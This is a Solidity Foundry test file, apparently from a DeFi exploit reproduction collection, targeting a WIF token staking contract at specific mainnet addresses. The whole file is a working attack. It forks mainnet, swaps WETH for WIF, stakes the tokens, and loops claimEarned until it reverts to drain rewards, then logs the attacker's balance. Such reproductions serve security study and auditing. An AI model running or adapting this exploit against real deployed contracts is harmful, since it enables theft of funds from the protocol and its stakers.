pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

interface WIFStaking is IERC20 {

    function stake(uint256 _stakingId, uint256 _amount) external;
    function claimEarned(uint256 _stakingId, uint256 _burnRate) external; 
}

contract WIFCOIN_ETHExploit is Test {
    WIFStaking WifStake_ =
        WIFStaking(address(0xA1cE40702E15d0417a6c74D0bAB96772F36F4E99));
    IERC20 Wif = IERC20(address(0xBFae33128ecF041856378b57adf0449181FFFDE7));
    IERC20 weth_ = IERC20(address(0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2));

    Uni_Router_V2 router_ =
        Uni_Router_V2(
            payable(address(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D))
        );

    function setUp() public {
        vm.createSelectFork("mainnet", 20103189);
        Wif.approve(address(router_), type(uint256).max);
        Wif.approve(address(WifStake_),  type(uint256).max);
        deal(address(weth_),address(this), 0.3 ether);
    }

    function testExploit() public {
        attack();
        emit log_named_decimal_uint("End of attack attacker's balance", Wif.balanceOf(address(this)), Wif.decimals());
    }
    
    function attack()public{
                address[] memory path = new address[](2);
        path[0] = address(weth_); // weth
        path[1] = address(Wif); // token
        router_.swapExactETHForTokens{value: 0.3 ether}(
            0,
            path,
            address(this),
            block.timestamp
        );
        Wif.approve(address(WifStake_),type(uint256).max);
        uint256 amount=Wif.balanceOf(address(this));
        WifStake_.stake(3, amount);
        while(true){
            try WifStake_.claimEarned(3, 10){

            }catch{
                break;
            }
        }

    }
}